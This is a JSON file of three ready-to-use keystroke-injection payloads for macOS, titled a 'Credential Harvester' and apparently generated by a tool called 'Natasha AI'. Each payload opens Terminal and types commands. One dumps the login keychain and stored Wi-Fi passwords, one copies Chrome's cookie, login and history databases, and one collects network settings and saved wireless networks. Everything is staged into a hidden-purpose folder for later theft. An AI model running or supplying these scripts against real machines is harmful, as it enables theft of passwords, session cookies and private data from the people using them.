{
  "metadata": {
    "name": "macOS Credential Harvester",
    "description": "Extracts stored credentials from macOS systems",
    "version": "1.0",
    "author": "Natasha AI"
  },
  "templates": [
    {
      "name": "Keychain Access",
      "description": "Lists keychain items and attempts to extract information",
      "attack_type": "credential_harvest",
      "script": [
        "REM macOS Keychain Information Extractor",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "GUI SPACE",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/Documents/natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;Keychain Access Information&quot; > ~/Documents/natasha_data/keychain_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;========================&quot; >> ~/Documents/natasha_data/keychain_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING security dump-keychain -d login.keychain | grep -A 5 &quot;class: genp&quot; >> ~/Documents/natasha_data/keychain_info.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nWiFi Passwords:&quot; >> ~/Documents/natasha_data/keychain_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;==============&quot; >> ~/Documents/natasha_data/keychain_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING security find-generic-password -D &quot;AirPort network password&quot; -a &quot;AirPort&quot; -g 2>&1 | grep &quot;password&quot; >> ~/Documents/natasha_data/keychain_info.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nChrome Data Locations:&quot; >> ~/Documents/natasha_data/keychain_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;====================&quot; >> ~/Documents/natasha_data/keychain_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING ls -la ~/Library/Application\\ Support/Google/Chrome/Default/ | grep -E &quot;Login|Cookies&quot; >> ~/Documents/natasha_data/keychain_info.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nSafari Data Locations:&quot; >> ~/Documents/natasha_data/keychain_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;====================&quot; >> ~/Documents/natasha_data/keychain_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING ls -la ~/Library/Safari/ | grep -E &quot;History|Bookmarks&quot; >> ~/Documents/natasha_data/keychain_info.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;Information saved to ~/Documents/natasha_data/keychain_info.txt&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {
        "credential_type": "keychain",
        "exfil_method": "file"
      }
    },
    {
      "name": "Chrome Cookies and Login Data",
      "description": "Extracts Chrome cookies and login data files",
      "attack_type": "credential_harvest",
      "script": [
        "REM macOS Chrome Data Extractor",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "GUI SPACE",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/Documents/natasha_data/chrome_data",
        "ENTER",
        "DELAY 300",
        "STRING CHROME_DIR=&quot;$HOME/Library/Application Support/Google/Chrome/Default&quot;",
        "ENTER",
        "DELAY 300",
        "STRING if [ -d &quot;$CHROME_DIR&quot; ]; then",
        "ENTER",
        "DELAY 300",
        "STRING   echo &quot;Chrome data found, copying files...&quot;",
        "ENTER",
        "DELAY 300",
        "STRING   cp &quot;$CHROME_DIR/Cookies&quot; ~/Documents/natasha_data/chrome_data/ 2>/dev/null",
        "ENTER",
        "DELAY 300",
        "STRING   cp &quot;$CHROME_DIR/Login Data&quot; ~/Documents/natasha_data/chrome_data/ 2>/dev/null",
        "ENTER",
        "DELAY 300",
        "STRING   cp &quot;$CHROME_DIR/History&quot; ~/Documents/natasha_data/chrome_data/ 2>/dev/null",
        "ENTER",
        "DELAY 300",
        "STRING   echo &quot;Files copied to ~/Documents/natasha_data/chrome_data/&quot;",
        "ENTER",
        "DELAY 300",
        "STRING   echo &quot;Chrome Data Summary:&quot; > ~/Documents/natasha_data/chrome_summary.txt",
        "ENTER",
        "DELAY 300",
        "STRING   echo &quot;===================&quot; >> ~/Documents/natasha_data/chrome_summary.txt",
        "ENTER",
        "DELAY 300",
        "STRING   echo &quot;Files extracted:&quot; >> ~/Documents/natasha_data/chrome_summary.txt",
        "ENTER",
        "DELAY 300",
        "STRING   ls -la ~/Documents/natasha_data/chrome_data/ >> ~/Documents/natasha_data/chrome_summary.txt",
        "ENTER",
        "DELAY 300",
        "STRING else",
        "ENTER",
        "DELAY 300",
        "STRING   echo &quot;Chrome data not found.&quot; > ~/Documents/natasha_data/chrome_summary.txt",
        "ENTER",
        "DELAY 300",
        "STRING fi",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;Information saved to ~/Documents/natasha_data/&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {
        "browser": "chrome",
        "exfil_method": "file"
      }
    },
    {
      "name": "Network Configuration",
      "description": "Extracts network configuration and saved networks",
      "attack_type": "credential_harvest",
      "script": [
        "REM macOS Network Configuration Extractor",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "GUI SPACE",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/Documents/natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;Network Configuration&quot; > ~/Documents/natasha_data/network_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;=====================&quot; >> ~/Documents/natasha_data/network_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;\\nNetwork Interfaces:&quot; >> ~/Documents/natasha_data/network_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING ifconfig >> ~/Documents/natasha_data/network_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nIP Configuration:&quot; >> ~/Documents/natasha_data/network_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING ipconfig getpacket en0 >> ~/Documents/natasha_data/network_info.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nWiFi Networks:&quot; >> ~/Documents/natasha_data/network_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING networksetup -listallhardwareports >> ~/Documents/natasha_data/network_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nPreferred Networks:&quot; >> ~/Documents/natasha_data/network_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING networksetup -listpreferredwirelessnetworks en0 >> ~/Documents/natasha_data/network_info.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nDNS Configuration:&quot; >> ~/Documents/natasha_data/network_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING scutil --dns >> ~/Documents/natasha_data/network_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;Information saved to ~/Documents/natasha_data/network_info.txt&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {
        "credential_type": "network",
        "exfil_method": "file"
      }
    }
  ]
}